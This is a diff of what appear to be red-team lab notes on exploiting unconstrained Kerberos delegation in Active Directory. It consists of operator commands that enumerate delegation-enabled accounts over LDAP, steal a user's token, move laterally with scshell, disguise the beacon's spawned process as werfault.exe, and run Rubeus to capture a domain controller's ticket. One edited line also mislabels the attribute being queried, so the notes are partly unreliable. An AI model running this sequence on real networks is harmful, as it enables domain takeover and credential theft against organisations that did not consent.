@@ -1,11 +1,7 @@
-use LDAP to find users with constrained delegation (where the AllowedToDelegateTo attribute is not null)
-    ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
+use LDAP to find users with unconstrained delegation (where the AllowedToDelegateTo attribute is not null)
+    beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
 
-we see LON-WS-1$ is AllowedToDelegateTo to cifs (file server) and has a non-default UAC value
-check that the TRUSTED_TO_AUTH_FOR_DELEGATION flag is set
-    powershell> [Convert]::ToBoolean(16781312 -band 16777216)
-
-we verify that protocol transition is enabled
+we see that lon-ws-1$ has unconstrained delegation
 
 move laterally to the web server
     steal token from rsteel
@@ -13,7 +9,7 @@ move laterally to the web server
     beacon> jump scshell64 lon-ws-1 smb
 
 now interact with the web server beacon 
-    spawnto x64 %windir%\sysnative\werfault.exe
+    beacon> spawnto x64 %windir%\sysnative\werfault.exe
 
 now monitor via rubeus
     beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
